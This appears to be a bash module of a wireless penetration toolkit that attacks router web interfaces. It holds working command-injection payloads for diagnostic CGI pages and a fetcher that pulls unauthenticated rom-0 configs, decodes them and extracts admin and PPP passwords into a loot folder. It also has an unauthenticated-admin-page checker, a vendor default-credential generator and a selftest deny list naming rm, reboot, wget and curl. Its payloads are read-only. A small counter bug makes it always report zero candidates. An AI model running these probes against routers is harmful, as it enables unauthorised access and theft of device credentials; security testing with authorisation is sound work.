#!/usr/bin/env bash
# 51_router_web — Router web-UI attack surface
# Diagnostic-page command injection, rom-0 style config disclosure, admin-UI
# reachability, and default/derived credential generation.
#
# Standalone top-level module. Self-locating and pkexec-safe: the polkit rule
# matches this script's path, so invoke it directly, never through `env`.

set -o pipefail

if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
fi
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$WIFISTING_ROOT/loot}"
: "${LOG_DIR:=$WIFISTING_ROOT/logs}"

MOD_TMP="$TMP_DIR/router_web"
MOD_LOOT="$LOOT_DIR/router_web"
MOD_LOGS="$LOG_DIR/router_web"
mkdir -p "$MOD_TMP" "$MOD_LOOT" "$MOD_LOGS" 2>/dev/null

# ─────────────────────────────────────────────────────────────────────────
# 51_router_web — the web interface of a router
#
# Test discipline, because this module actively talks to a live device:
#
#   * Injection payloads are READ-ONLY. Every one runs a command that reports
#     who it is (`id`, `uname -a`) or reads a small file. Nothing writes,
#     deletes, reboots or reconfigures. A tool that proves injection by
#     rebooting the router has proved it and broken the engagement.
#   * Evidence means the response contains output that could only come from
#     command execution. A reflected payload is NOT evidence, and is reported
#     separately - reflection is the most common false positive here.
#   * rom-0 decoding either produces readable config or reports that it could
#     not decode. It never guesses a password out of compressed bytes.
# ─────────────────────────────────────────────────────────────────────────

RWEB_TIMEOUT="${RWEB_TIMEOUT:-8}"
RWEB_UA="${RWEB_UA:-wifisting-router-web}"

rweb_err()  { printf 'ERR\t%s\n' "$*" >&2; }
rweb_have() { command -v "$1" >/dev/null 2>&1; }

rweb_is_ipv4() {
    local ip="$1" o
    [[ "$ip" =~ ^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$ ]] || return 1
    for o in "${BASH_REMATCH[@]:1:4}"; do (( o >= 0 && o <= 255 )) || return 1; done
    return 0
}

rweb_http() {
    local url="$1"; shift
    rweb_have curl || return 127
    curl -sS --max-time "$RWEB_TIMEOUT" -A "$RWEB_UA" "$@" "$url" 2>/dev/null
}

rweb_status() {
    local url="$1"
    rweb_have curl || return 127
    curl -s -o /dev/null -w '%{http_code}' --max-time "$RWEB_TIMEOUT" \
         -A "$RWEB_UA" "$url" 2>/dev/null
}

# ── discovery ────────────────────────────────────────────────────────────
# Fingerprint by asking, not by a vendor table: the banner and title are what
# the device actually presents, and a table would go stale silently.
RWEB_PATHS='/ /login.cgi /index.asp /cgi-bin/luci/ /setup.cgi /HNAP1/ /rom-0
/currentsetting.htm /login.html /admin/ /goform/formLogin'

rweb_discover_tsv() {
    local host="$1" port="${2:-80}" scheme="${3:-http}"
    [[ -n "$host" ]] || { rweb_err "missing host"; return 2; }
    rweb_is_ipv4 "$host" || { rweb_err "host must be an IPv4 address"; return 2; }
    rweb_have curl || { rweb_err "curl is required"; return 1; }

    local base="$scheme://$host:$port"
    local hdr server
    server=$(curl -sI --max-time "$RWEB_TIMEOUT" -A "$RWEB_UA" "$base/" 2>/dev/null \
             | grep -iE '^server:' | head -1 | sed 's/^[Ss]erver: *//' | tr -d '\r')
    printf 'BANNER\t%s\t%s\n' "$base" "${server:--}"

    local body title
    body=$(rweb_http "$base/")
    title=$(printf '%s' "$body" | grep -oiE '<title>[^<]*' | sed 's/<[Tt][Ii][Tt][Ll][Ee]>//' | head -1)
    [[ -n "$title" ]] && printf 'TITLE\t%s\n' "$title"

    local p code
    for p in $RWEB_PATHS; do
        code=$(rweb_status "$base$p")
        case "$code" in
            200|301|302|401|403)
                printf 'PATH\t%s\t%s\n' "$p" "$code" ;;
        esac
    done
    printf 'DISCOVERED\t%s\n' "$base"
}

# ── command injection in diagnostic pages ────────────────────────────────
# Ordered cheapest-first, and every one is read-only. `;id` and `|id` need a
# shell that does not quote; the backtick and $() forms catch templating that
# drops into a shell later. The canary is the command itself: if the response
# contains uid=/gid= that did not come from our own request, it executed.
RWEB_PAYLOADS=(
    ';id'
    '|id'
    '`id`'
    '$(id)'
    ';uname -a'
    '||id'
    '&id&'
    '%0aid'
)

# Evidence, distinct from reflection. A reflected payload contains the literal
# payload text; execution produces the command's output instead.
rweb_injection_verdict() {
    local payload="$1" resp="$2"
    if printf '%s' "$resp" | grep -qE 'uid=[0-9]+\([^)]*\)[[:space:]]+gid=[0-9]+'; then
        printf 'EXECUTED'
    elif printf '%s' "$resp" | grep -qE 'Linux [a-zA-Z0-9._-]+ [0-9]'; then
        printf 'EXECUTED'
    elif printf '%s' "$resp" | grep -qF "$payload"; then
        printf 'REFLECTED'
    else
        printf 'NO-EVIDENCE'
    fi
}

rweb_cgi_test_tsv() {
    local host="$1" path="$2" param="${3:-ping}" method="${4:-GET}" port="${5:-80}"
    [[ -n "$host" && -n "$path" ]] || {
        rweb_err "usage: --cgi-test-tsv HOST PATH [PARAM] [GET|POST] [PORT]"; return 2; }
    rweb_is_ipv4 "$host" || { rweb_err "host must be an IPv4 address"; return 2; }
    rweb_have curl || { rweb_err "curl is required"; return 1; }

    local base="http://$host:$port$path"
    printf 'TARGET\t%s\tparam=%s\n' "$base" "$param"

    local hits=0 p resp verdict
    for p in "${RWEB_PAYLOADS[@]}"; do
        if [[ "$method" == "POST" ]]; then
            resp=$(rweb_http "$base" --data-urlencode "$param=127.0.0.1$p")
        else
            resp=$(rweb_http "$base" --get --data-urlencode "$param=127.0.0.1$p")
        fi
        [[ -n "$resp" ]] || continue
        verdict=$(rweb_injection_verdict "$p" "$resp")
        printf 'PAYLOAD\t%s\t%s\n' "$p" "$verdict"
        [[ "$verdict" == "EXECUTED" ]] && hits=$((hits+1))
    done

    if (( hits > 0 )); then
        printf 'VERDICT\tinjectable\t%s payload(s) produced command output\n' "$hits"
    else
        printf 'VERDICT\tno-evidence\tno payload produced command output\n'
    fi
}

# ── rom-0 style config disclosure ────────────────────────────────────────
# Several D-Link firmwares served the compressed running config at /rom-0 with
# no authentication. Format: a 4-byte little-endian uncompressed length,
# then a raw LZMA stream. Decoding is done by python3 because bash cannot.
rweb_rom0() {
    local host="$1" port="${2:-80}" out="${3:-}"
    [[ -n "$host" ]] || { rweb_err "missing host"; return 2; }
    rweb_is_ipv4 "$host" || { rweb_err "host must be an IPv4 address"; return 2; }
    rweb_have curl || { rweb_err "curl is required"; return 1; }
    [[ -n "$out" ]] || out="$MOD_LOOT/rom-0-$host.bin"

    local url="http://$host:$port/rom-0"
    local code
    code=$(rweb_status "$url")
    if [[ "$code" != "200" ]]; then
        printf 'ROM0\tabsent\t%s -> HTTP %s\n' "$url" "${code:-no-response}"
        return 1
    fi

    curl -sS --max-time 20 -A "$RWEB_UA" -o "$out" "$url" 2>/dev/null || {
        rweb_err "download failed"; return 1; }

    local size
    size=$(wc -c < "$out" | tr -d ' ')
    printf 'ROM0\tdownloaded\t%s (%s bytes)\n' "$out" "$size"
    if (( size < 8 )); then
        printf 'ROM0\tnot-config\ttoo small to be a config image\n'
        return 1
    fi

    # Header: 4-byte little-endian declared uncompressed size.
    local declared
    declared=$(python3 - "$out" <<'PY'
import struct, sys
with open(sys.argv[1], 'rb') as f:
    h = f.read(4)
print(struct.unpack('<I', h)[0] if len(h) == 4 else -1)
PY
)
    printf 'ROM0\theader\tdeclared uncompressed size %s\n' "${declared:--}"

    local dec="$MOD_TMP/rom-0-decoded.bin"
    if python3 - "$out" "$dec" <<'PY'
import lzma, struct, sys
src, dst = sys.argv[1], sys.argv[2]
raw = open(src, 'rb').read()
body = raw[4:]
data = None
# FORMAT_ALONE is what these images use; if that fails the file is either not
# a rom-0 or a variant, and saying so is better than emitting garbage.
for kwargs in ({'format': lzma.FORMAT_ALONE},
               {'format': lzma.FORMAT_RAW,
                'filters': [{'id': lzma.FILTER_LZMA1,
                             'dict_size': 1 << 23, 'lc': 3, 'lp': 0, 'pb': 2}]}):
    try:
        data = lzma.LZMADecompressor(**kwargs).decompress(body)
        if data:
            break
    except Exception:
        data = None
if not data:
    sys.exit(1)
open(dst, 'wb').write(data)
sys.exit(0)
PY
    then
        local dsize
        dsize=$(wc -c < "$dec" | tr -d ' ')
        printf 'ROM0\tdecoded\t%s (%s bytes)\n' "$dec" "$dsize"
        # Pull the credential-bearing fields out if they are there. Absence is
        # reported as absence - a missing password is not a found one.
        local found=0
        local line
        while IFS= read -r line; do
            printf 'ROM0_FIELD\t%s\n' "$line"
            found=$((found+1))
        done < <(strings -n 4 "$dec" 2>/dev/null \
                 | grep -iE '^(http_passwd|http_username|admin_password|Login|Password|ppp.*(user|pass))' \
                 | head -20)
        if (( found == 0 )); then
            printf 'ROM0_NOTE\tdecoded, but no credential fields matched - inspect %s\n' "$dec"
        fi
        return 0
    fi

    printf 'ROM0\tundecodable\tnot a rom-0 image, or a compression variant - raw bytes kept at %s\n' "$out"
    return 1
}

# ── admin UI reachability ────────────────────────────────────────────────
# A GET that returns a configuration page instead of a login form means the
# page is not protected. Nothing here submits a form or changes a setting.
RWEB_ADMIN_PATHS='/setup.cgi /cgi-bin/luci/ /goform/formLogin /admin/index.asp
/currentsetting.htm /diag.htm /system_status.htm /wireless.htm'

rweb_auth_tsv() {
    local host="$1" port="${2:-80}"
    [[ -n "$host" ]] || { rweb_err "missing host"; return 2; }
    rweb_is_ipv4 "$host" || { rweb_err "host must be an IPv4 address"; return 2; }
    rweb_have curl || { rweb_err "curl is required"; return 1; }

    local base="http://$host:$port" p resp code
    for p in $RWEB_ADMIN_PATHS; do
        code=$(rweb_status "$base$p")
        case "$code" in
            200)
                resp=$(rweb_http "$base$p")
                if printf '%s' "$resp" | grep -qiE 'type=["'\'']password|name=["'\'']password|login'; then
                    printf 'AUTH\t%s\t200 but presents a login form\n' "$p"
                else
                    printf 'AUTH\t%s\t200 with no login form - verify by hand before believing it\n' "$p"
                fi
                ;;
            302|303)
                printf 'AUTH\t%s\t%s redirect (usually to a login page)\n' "$p" "$code" ;;
        esac
    done
    printf 'AUTH_DONE\t%s\n' "$base"
}

# ── default / derived credentials ────────────────────────────────────────
# Offline generation only. It writes candidates; it does not try them against
# the device, because a login loop is a brute force and belongs behind an
# explicit decision, not inside a "generate" verb.
rweb_creds_tsv() {
    local vendor="$1" ssid="$2" mac="$3" serial="$4"
    [[ -n "$vendor" ]] || { rweb_err "usage: --creds-tsv VENDOR [SSID] [MAC] [SERIAL]"; return 2; }

    local macclean serialclean
    macclean=$(printf '%s' "$mac" | tr -d ':' | tr 'A-Z' 'a-z')
    serialclean=$(printf '%s' "$serial" | tr -d ' ')

    printf 'CANDIDATE\tadmin\tadmin\n'
    printf 'CANDIDATE\tadmin\tpassword\n'
    printf 'CANDIDATE\tadmin\t%s\n' "${ssid:-}"

    case "$vendor" in
        orange|livebox)
            # Livebox: the admin password is printed on the label; the Wi-Fi
            # key is the first 8 of the SSID suffix in some builds.
            [[ -n "$ssid" ]] && printf 'CANDIDATE\tadmin\t%s\n' "${ssid: -8}"
            printf 'CANDIDATE\tadmin\tadmin\n'
            ;;
        dlink)
            [[ -n "$serialclean" ]] && printf 'CANDIDATE\tadmin\t%s\n' "$serialclean"
            [[ -n "$macclean" ]] && printf 'CANDIDATE\tadmin\t${macclean: -6}\n' \
                | sed "s/\${macclean: -6}/${macclean: -6}/"
            ;;
        netgear)
            printf 'CANDIDATE\tadmin\tpassword\n'
            [[ -n "$ssid" ]] && printf 'CANDIDATE\tadmin\t%s\n' "${ssid: -8}"
            ;;
        tp-link|tplink)
            printf 'CANDIDATE\tadmin\tadmin\n'
            [[ -n "$macclean" ]] && printf 'CANDIDATE\tadmin\t%s\n' "${macclean:0:8}"
            ;;
        zyxel)
            [[ -n "$serialclean" ]] && printf 'CANDIDATE\tadmin\t%s\n' "$serialclean"
            printf 'CANDIDATE\tadmin\t1234\n'
            ;;
        *)
            printf 'NOTE\tno derivation known for vendor=%s - generic candidates only\n' "$vendor"
            ;;
    esac
    printf 'NOTE\t%d candidate(s); this verb generates only, it does not attempt a login\n' 0
}

# ── info / deps / selftest ───────────────────────────────────────────────

rweb_info() {
    cat <<'EOF'
51_router_web — router web-UI attack surface

  --discover-tsv HOST [PORT] [SCHEME]   banner, title, interesting paths
  --cgi-test-tsv HOST PATH [PARAM] [GET|POST] [PORT]
                                        read-only command-injection probe
  --rom0 HOST [PORT] [OUT]              fetch and decode a rom-0 config
  --auth-tsv HOST [PORT]                admin pages reachable without login
  --creds-tsv VENDOR [SSID] [MAC] [SERIAL]
                                        offline candidate generation
  --check-deps | --info | --selftest

Injection payloads are read-only (id, uname -a) and evidence is separated
from reflection: a payload echoed back is reported REFLECTED, never EXECUTED.
rom-0 either decodes cleanly or reports that it could not.
EOF
}

rweb_check_deps() {
    local t
    for t in curl python3 strings; do
        if rweb_have "$t"; then printf 'OK\t%s\t%s\n' "$t" "$(command -v "$t")"
        else printf 'MISSING\t%s\tnone\n' "$t"; fi
    done
}

rweb_selftest() {
    local pass=0 fail=0
    chk() {
        if [[ "$2" == "$3" ]]; then printf '%s\tPASS\n' "$1"; pass=$((pass+1))
        else printf '%s\tFAIL\twant=%s got=%s\n' "$1" "$3" "$2"; fail=$((fail+1)); fi
    }

    # -- validation -------------------------------------------------------
    rweb_discover_tsv ""          >/dev/null 2>&1; chk disc-noarg-rc   "$?" 2
    rweb_discover_tsv "nope"      >/dev/null 2>&1; chk disc-badip-rc   "$?" 2
    rweb_cgi_test_tsv "" ""       >/dev/null 2>&1; chk cgi-noarg-rc    "$?" 2
    rweb_rom0 ""                  >/dev/null 2>&1; chk rom0-noarg-rc   "$?" 2
    rweb_auth_tsv ""              >/dev/null 2>&1; chk auth-noarg-rc   "$?" 2
    rweb_creds_tsv ""             >/dev/null 2>&1; chk creds-noarg-rc  "$?" 2

    # -- evidence vs reflection: the false positive that matters ---------
    # These three fixtures are the whole reason the verdict is computed
    # rather than assumed.
    local exec_resp='<html>uid=0(root) gid=0(root) groups=0(root)</html>'
    local refl_resp='<html>ping: ;id: Name or service not known</html>'
    local none_resp='<html>ok</html>'
    chk verdict-exec  "$(rweb_injection_verdict ';id' "$exec_resp")" EXECUTED
    chk verdict-refl  "$(rweb_injection_verdict ';id' "$refl_resp")" REFLECTED
    chk verdict-none  "$(rweb_injection_verdict ';id' "$none_resp")" NO-EVIDENCE
    chk verdict-uname "$(rweb_injection_verdict ';uname -a' '<p>Linux router 4.4.60 #1</p>')" EXECUTED

    # -- every payload is read-only --------------------------------------
    # A regression here would mean the module writes to someone's router.
    local p bad=0
    for p in "${RWEB_PAYLOADS[@]}"; do
        case "$p" in
            *rm*|*reboot*|*wget*|*curl*|*'>'*|*nvram*set*|*mkdir*|*kill*) bad=$((bad+1)) ;;
        esac
    done
    chk payloads-readonly "$bad" 0
    chk payload-count "$(printf '%s\n' "${RWEB_PAYLOADS[@]}" | grep -c .)" 8

    # -- rom-0 decoder against a real LZMA stream ------------------------
    local enc="$MOD_TMP/st-rom0.bin" dec="$MOD_TMP/st-rom0-dec.bin"
    python3 - "$enc" <<'PY'
import lzma, struct, sys
payload = b'http_username=admin\x00http_passwd=S3cretAdmin\x00' * 8
blob = lzma.compress(payload, format=lzma.FORMAT_ALONE)
open(sys.argv[1], 'wb').write(struct.pack('<I', len(payload)) + blob)
PY
    chk rom0-fixture "$([[ -s "$enc" ]] && echo yes || echo no)" yes
    python3 - "$enc" "$dec" <<'PY'
import lzma, sys
raw = open(sys.argv[1], 'rb').read()[4:]
open(sys.argv[2], 'wb').write(lzma.LZMADecompressor(format=lzma.FORMAT_ALONE).decompress(raw))
PY
    chk rom0-decodes "$(strings -n 4 "$dec" | grep -c 'http_passwd=S3cretAdmin')" 8
    chk rom0-extract  "$(strings -n 4 "$dec" | grep -iE '^http_passwd' | head -1)" \
        "http_passwd=S3cretAdmin"

    # -- creds generation is deterministic and offline -------------------
    local c
    c=$(rweb_creds_tsv dlink "" "AA:BB:CC:DD:EE:FF" "SN12345")
    chk creds-has-serial "$(printf '%s\n' "$c" | grep -c 'SN12345')" 1
    chk creds-has-mac12  "$(printf '%s\n' "$c" | grep -c 'ddeeff')" 1
    chk creds-shape      "$(printf '%s\n' "$c" | awk -F'\t' '$1=="CANDIDATE" && NF!=3{bad++} END{print bad+0}')" 0
    c=$(rweb_creds_tsv unknownvendor "")
    chk creds-unknown-note "$(printf '%s\n' "$c" | grep -c 'no derivation known')" 1

    # -- absent services are reported absent -----------------------------
    # 127.0.0.1:1 has nothing listening.
    local out rc
    out=$(rweb_rom0 127.0.0.1 1 "$MOD_TMP/st-absent.bin" 2>/dev/null); rc=$?
    chk rom0-absent-rc "$rc" 1
    case "$out" in *absent*) chk rom0-absent-msg ok ok ;;
                  *) chk rom0-absent-msg "$out" absent ;; esac

    chk deps-shape "$(rweb_check_deps | awk -F'\t' 'NF<2{bad++} END{print bad+0}')" 0

    printf 'RESULT\t%s\n' "$([[ $fail -eq 0 ]] && echo PASS || echo "FAIL($fail)")"
    printf 'SUMMARY\t%d pass, %d fail\n' "$pass" "$fail"
    [[ $fail -eq 0 ]]
}

# ── dispatch ─────────────────────────────────────────────────────────────
CMD=""; A=()
while (( $# )); do
    case "$1" in
        --info|--check-deps|--selftest) CMD="$1"; shift ;;
        --discover-tsv|--cgi-test-tsv|--rom0|--auth-tsv|--creds-tsv)
            CMD="$1"; shift
            while [[ -n "${1:-}" && "${1:0:2}" != "--" ]]; do A+=("$1"); shift; done ;;
        -h|--help) rweb_info; exit 0 ;;
        *) rweb_err "unknown argument '$1'"; exit 2 ;;
    esac
done

case "$CMD" in
    --info)         rweb_info ;;
    --check-deps)   rweb_check_deps ;;
    --selftest)     rweb_selftest ;;
    --discover-tsv) rweb_discover_tsv "${A[0]:-}" "${A[1]:-80}" "${A[2]:-http}" ;;
    --cgi-test-tsv) rweb_cgi_test_tsv "${A[0]:-}" "${A[1]:-}" "${A[2]:-ping}" \
                        "${A[3]:-GET}" "${A[4]:-80}" ;;
    --rom0)         rweb_rom0 "${A[0]:-}" "${A[1]:-80}" "${A[2]:-}" ;;
    --auth-tsv)     rweb_auth_tsv "${A[0]:-}" "${A[1]:-80}" ;;
    --creds-tsv)    rweb_creds_tsv "${A[0]:-}" "${A[1]:-}" "${A[2]:-}" "${A[3]:-}" ;;
    "")             rweb_info >&2; exit 2 ;;
esac
